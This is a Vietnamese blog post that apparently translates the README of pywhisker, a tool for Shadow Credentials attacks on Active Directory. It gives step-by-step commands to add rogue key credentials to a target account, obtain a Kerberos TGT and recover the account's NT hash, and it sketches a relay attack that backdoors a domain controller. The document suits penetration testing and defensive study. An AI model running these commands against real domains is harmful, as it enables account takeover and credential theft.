---
title: Công cụ pywhisker
date: 1/8/2021
layout: single
header:
  teaser: https://github.com/ShutdownRepo/pywhisker/blob/main/.assets/add_pem.png?raw=true
--- 

## Giới thiệu PyWhisker 
Tác giả: ShutdownRepo

Khai thác: [github/ShutdownRepo/pywhiske](https://github.com/ShutdownRepo/pywhisker)

PyWhisker là một Python tương đương với [Whisker](https://github.com/eladshamir/Whisker) gốc do [Elad Shamir](https://twitter.com/elad_shamir) tạo ra và được viết bằng C#. Công cụ này cho phép người dùng thao tác thuộc tính `msDS-KeyCredentialLink` của người dùng máy tính mục tiêu để có toàn quyền kiểm soát đối tượng đó. Nó dựa trên [Impacket](https://github.com/SecureAuthCorp/impacket) và trên Python tương đương với DSInternals của [Michael Grafnetter](https://twitter.com/MGrafnetter) được gọi là [PyDSInternals](https://github.com/p0dalirius/pydsinternals). Công cụ này, cùng với [PKINITtools](https://github.com/dirkjanm/PKINITtools) của [Dirk-jan](https://twitter.com/_dirkjan) cho phép khai thác hoàn toàn nguyên thủy chỉ trên các hệ thống dựa trên UNIX.

Điều kiện tiên quyết cho cuộc tấn công này như sau

1. Mức chức năng miền mục tiêu phải là Windows Server 2016 trở lên.
2. Miền đích phải có ít nhất một Bộ điều khiển miền chạy Windows Server 2016 trở lên.
3. Bộ điều khiển miền để sử dụng trong cuộc tấn công phải có chứng chỉ và khóa riêng (điều này có nghĩa là tổ chức phải có AD CS hoặc PKI, CA hoặc thứ gì đó tương tự).
4. Kẻ tấn công phải có quyền kiểm soát tài khoản có thể ghi thuộc tính msDs-KeyCredentialLink của tài khoản máy tính hoặc người dùng mục tiêu

Tại sao một số yêu cầu trước?

+ Yêu cầu trước 1 và 2 vì các tính năng PKINIT đã được giới thiệu với Windows Server 2016
+ Yêu cầu trước 3 vì DC cần chứng chỉ và khóa của riêng nó để trao đổi khóa phiên trong giao dịch `AS_REQ <-> AS_REP`.

A `KRB-ERROR (16) : KDC_ERR_PADATA_TYPE_NOSUPP` sẽ được nâng lên nếu yêu cầu trước 3 không được đáp ứng.

Thông tin thêm về Shadow Credentials này
+ [Shadow Credentials: Abusing Key Trust Account Mapping for Takeover](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
+ [The Hacker Recipes - ACEs abuse](https://www.thehacker.recipes/active-directory-domain-services/movement/access-control-entries)
+ [The Hacker Recipes - Shadow Credentials](https://www.thehacker.recipes/active-directory-domain-services/movement/access-control-entries/shadow-credentials)

## Sử dụng
pyWhisker hỗ trợ các xác thực sau

+ (NTLM) Cleartext password
+ (NTLM) [Pass-the-hash](https://www.thehacker.recipes/active-directory-domain-services/movement/lm-and-ntlm/pass-the-hash)
+ (Kerberos) Cleartext password
+ (Kerberos) [Pass-the-key](https://www.thehacker.recipes/active-directory-domain-services/movement/kerberos/pass-the-key) / [Overpass-the-hash](https://www.thehacker.recipes/active-directory-domain-services/movement/kerberos/overpass-the-hash)
+ (Kerberos) [Pass-the-cache](https://www.thehacker.recipes/active-directory-domain-services/movement/kerberos/pass-the-cache) (type of [Pass-the-ticket](https://www.thehacker.recipes/active-directory-domain-services/movement/kerberos/pass-the-ticket))

Trong số những thứ khác, pyWhisker hỗ trợ nhiều cấp độ chi tiết, chỉ cần thêm `-v`,`-vv`

[![Language](https://img.shields.io/badge/Lang-python-blue.svg)](https://www.python.org/)

```powershell
usage: pywhisker.py [-h] -t TARGET_SAMNAME [-a [{list,add,remove,clear,info}]] [--use-ldaps] [-v] [-q] [--no-pass] [--dc-ip ip address] [-d DOMAIN] [-u USER]
                    (-p PASSWORD | -H [LMHASH:]NTHASH | --aes-key hex key | -k) [-cp CERT_PASSWORD] [-o OUTPUT_PATH] [-e {PEM, PFX}] [-D DEVICE_ID]

Python (re)setter for property msDS-KeyCredentialLink for Shadow Credentials attacks.

optional arguments:
  -h, --help            show this help message and exit
  -t TARGET_SAMNAME, --target TARGET_SAMNAME
                        Target account
  -a [{list,add,remove,clear,info}], --action [{list,add,remove,clear,info}]
                        Action to operate on msDS-KeyCredentialLink
  --use-ldaps           Use LDAPS instead of LDAP
  -v, --verbose         verbosity level (-v for verbose, -vv for debug)
  -q, --quiet           show no information at all

authentication:
  --no-pass             don't ask for password (useful for -k)

authentication & connection:
  --dc-ip ip address    IP Address of the domain controller or KDC (Key Distribution Center) for Kerberos. If omitted it will use the domain part (FQDN) specified in the identity parameter
  -d DOMAIN, --domain DOMAIN
                        (FQDN) domain to authenticate to
  -u USER, --user USER  user to authenticate with
  -p PASSWORD, --password PASSWORD
                        password to authenticate with
  -H [LMHASH:]NTHASH, --hashes [LMHASH:]NTHASH
                        NT/LM hashes, format is LMhash:NThash
  --aes-key hex key     AES key to use for Kerberos Authentication (128 or 256 bits)
  -k, --kerberos        Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the
                        command line

arguments when setting -action to add:
  -cp CERT_PASSWORD, --cert-password CERT_PASSWORD
                        password for the stored self-signed certificate (will be random if not set)
  -o OUTPUT_PATH, --output-path OUTPUT_PATH
                        filename to store the generated self-signed PEM or PFX certificate and key
  -e {PEM, PFX}, --export {PEM, PFX}
                        choose to export cert+private key in PEM or PFX (i.e. #PKCS12) (default: PFX))

arguments when setting -action to remove:
  -D DEVICE_ID, --device-id DEVICE_ID
                        device ID of the KeyCredentialLink to remove when setting -action to remove

```
Dưới đây là các ví dụ và ảnh chụp màn hình về những gì PyWhisker có thể làm

## Liệt kê và nhận thông tin
PyWhisker có khả năng liệt kê các KeyCredentials hiện có. Ngoài ra, nó có thể mở toàn bộ cấu trúc để hiển thị mọi phần thông tin mà đối tượng chứa (bao gồm cả các tham số khóa công khai RSA)

```powershell
python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "list"
python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "info" --device-id 6419739b-ff90-f5c7-0737-1331daeb7db6
```
![1](https://github.com/ShutdownRepo/pywhisker/raw/main/.assets/list_info.png)

## Clear and remove
PyWhisker có khả năng xóa các giá trị cụ thể hoặc xóa toàn bộ thuộc tính.
```powershell
python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "remove" --device-id a8ce856e-9b58-61f9-8fd3-b079689eb46e
```
![2](https://github.com/ShutdownRepo/pywhisker/raw/main/.assets/remove.png)

```powershell
python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "clear"
```
![3](https://github.com/ShutdownRepo/pywhisker/raw/main/.assets/clear.png)

## Thêm giá trị mới
PyWhisker có khả năng tạo khóa RSA, chứng chỉ X509, cấu trúc KeyCredential và ghi thông tin cần thiết dưới dạng giá trị mới của thuộc tính `msDs-KeyCredentialLink`. Chứng chỉ có thể được xuất ở định dạng PFX (# PKCS12, khóa riêng của chứng chỉ được bảo vệ bằng mật khẩu) hoặc ở định dạng PEM (chứng chỉ PEM, khóa riêng PEM, không cần mật khẩu).

## Ví dụ với định dạng PFX
```powershell
python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "add" --output-path test1
```
![4](https://github.com/ShutdownRepo/pywhisker/raw/main/.assets/add_pfx.png)

Khi các giá trị được tạo và thêm bởi pyWhisker, TGT có thể được yêu cầu với [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py). Băm NT sau đó có thể được khôi phục bằng [getnthash.py](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py)

```powershell
python3 PKINITtools/gettgtpkinit.py -cert-pfx test1.pfx -pfx-pass xl6RyLBLqdhBlCTHJF3R domain.local/user2 user2.ccache
python3 PKINITtools/getnthash.py -key f4d6738897808edd3868fa8c60f147366c41016df623de048d600d4e2f156aa9 domain.local/user2
```
![5](https://github.com/ShutdownRepo/pywhisker/raw/main/.assets/add_pfx_gettgtnthash.png)

## Ví dụ với định dạng PEM
```powershell
python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "add" --output-path test2 --export PEM
```

![6](https://github.com/ShutdownRepo/pywhisker/raw/main/.assets/add_pem.png)

Khi các giá trị được tạo và thêm bởi pyWhisker, TGT có thể được yêu cầu với `gettgtpkinit.py1`. Băm NT sau đó có thể được khôi phục bằng `getnthash.py`.

```powershell
python3 PKINITtools/gettgtpkinit.py -cert-pem test2_cert.pem -key-pem test2_priv.pem domain.local/user2 user2.ccache
python3 PKINITtools/getnthash.py -key 894fde81fb7cf87963e4bda9e9e288536a0508a1553f15fdf24731731cecad16 domain.local/user2
```

![7](https://github.com/ShutdownRepo/pywhisker/raw/main/.assets/add_pem_gettgtnthash.png)

## Xác thực chuyển tiếp
[Yêu cầu](https://github.com/SecureAuthCorp/impacket/pull/1132) hiện đang chờ phê duyệt để đưa tính năng "thêm" của pywhisker vào ntlmrelayx

![8](https://github.com/ShutdownRepo/pywhisker/raw/main/.assets/relay.png)

## Kiến thức hữu ích
Đối tượng người dùng không thể chỉnh sửa thuộc tính `msDS-KeyCredentialLink` của riêng họ. Các đối tượng máy tính có thể. Điều này có nghĩa là tình huống sau có thể hoạt động: kích hoạt xác thực NTLM từ DC01, chuyển tiếp nó đến DC02, khiến pywhisker chỉnh sửa thuộc tính của DC01 để tạo cửa sau xác thực trước Kerberos PKINIT trên đó

![9](https://github.com/ShutdownRepo/pywhisker/raw/main/.assets/user_cant_self_edit.png)

Các đối tượng máy tính có thể chỉnh sửa thuộc tính `msDS-KeyCredentialLink` của riêng chúng nhưng chỉ có thể thêm KeyCredential nếu chưa có

![10](https://github.com/ShutdownRepo/pywhisker/raw/main/.assets/computers_can_self_edit.png)

Nếu bạn gặp lỗi, hãy đảm bảo không có sự chênh lệch về thời gian giữa máy chủ lưu trữ kẻ tấn công của bạn và Trung tâm phân phối khóa (thường là Bộ điều khiển miền). Để tránh lỗi đó, các chứng chỉ được tạo bởi công cụ pyWhisker có giá trị 40 năm trước ngày hiện tại và 40 năm sau.

## Tín dụng và tài liệu tham khảo
+ Tín dụng cho [Dirk-jan](https://twitter.com/_dirkjan) vì công việc của anh ấy trên [PKINITtools](https://github.com/dirkjanm/PKINITtools/). Ban đầu, chúng tôi đã lên kế hoạch tái cấu trúc các tập lệnh Impacket (đặc biệt là [gettgt.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py)) để triển khai xác thực trước PKINIT không đối xứng cho Kerberos. Anh ấy đã cứu chúng tôi rất nhiều đau đầu bằng cách viết nó trước chúng tôi!
+ Tín dụng cho toàn bộ nhóm đằng sau [Impacket](https://github.com/SecureAuthCorp/impacket/) và những người đóng góp của nó.
+ Tín dụng cho [Elad Shamir](https://twitter.com/elad_shamir), người đã tạo ra công cụ C # ban đầu ([Whisker](https://github.com/eladshamir/Whisker)) và cho [Michael Grafnetter's](https://twitter.com/MGrafnetter), người đã tạo ra [DSInternals](https://github.com/MichaelGrafnetter/DSInternals), một thư viện thực hiện hầu hết các công việc nặng nhọc của Whisker. Anh ấy cũng là người đã thực hiện bản demo đầu tiên của Mũ đen trình bày về đòn tấn công 
